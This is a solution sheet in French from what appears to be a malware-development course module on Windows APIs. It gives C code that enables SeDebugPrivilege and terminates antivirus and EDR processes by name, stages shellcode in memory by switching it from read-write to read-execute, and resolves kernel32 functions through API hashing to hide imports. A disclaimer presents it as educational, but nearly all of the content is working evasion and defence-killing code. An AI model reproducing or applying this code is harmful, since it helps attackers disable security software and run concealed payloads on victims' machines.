⚠️ AVERTISSEMENT STRICT
Techniques de malware development. Usage éducatif uniquement.

SOLUTIONS - MODULE 23 : WINDOWS APIs

# 
SOLUTION 1 : PROCESS KILLING

## 

BOOL kill_av_processes() {
    const char* av_list[] = {"MsMpEng.exe", "CSFalconService.exe", "cb.exe"};
    

```c
    // Enable SeDebugPrivilege
```
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    TOKEN_PRIVILEGES tp;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    

```c
    // Enumerate and kill
```
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    
    Process32First(hSnapshot, &pe32);
    do {
        for (int i = 0; i < 3; i++) {
            if (strcmp(pe32.szExeFile, av_list[i]) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                TerminateProcess(hProc, 0);
                CloseHandle(hProc);
            }
        }
    } while (Process32Next(hSnapshot, &pe32));
}

# 
SOLUTION 2 : RW->RX PATTERN

## 

LPVOID allocate_rx_shellcode(BYTE* shellcode, SIZE_T size) {

```c
    // Allouer RW
```
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    

```c
    // Copier shellcode
```
    memcpy(mem, shellcode, size);
    

```c
    // Changer vers RX (pas RWX)
```
    DWORD old;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
    
    return mem;
}

# 
SOLUTION 3 : API HASHING

## 

DWORD hash_api(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;  // hash * 33 + c
    }
    return hash;
}

FARPROC resolve_by_hash(DWORD hash) {
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)kernel32;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)kernel32 + dos->e_lfanew);
    
    DWORD export_rva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)kernel32 + export_rva);
    
    DWORD* names = (DWORD*)((BYTE*)kernel32 + exports->AddressOfNames);
    DWORD* functions = (DWORD*)((BYTE*)kernel32 + exports->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)kernel32 + exports->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)kernel32 + names[i]);
        if (hash_api(name) == hash) {
            return (FARPROC)((BYTE*)kernel32 + functions[ordinals[i]]);
        }
    }
    return NULL;
}

Référence : MSDN Process and Memory APIs

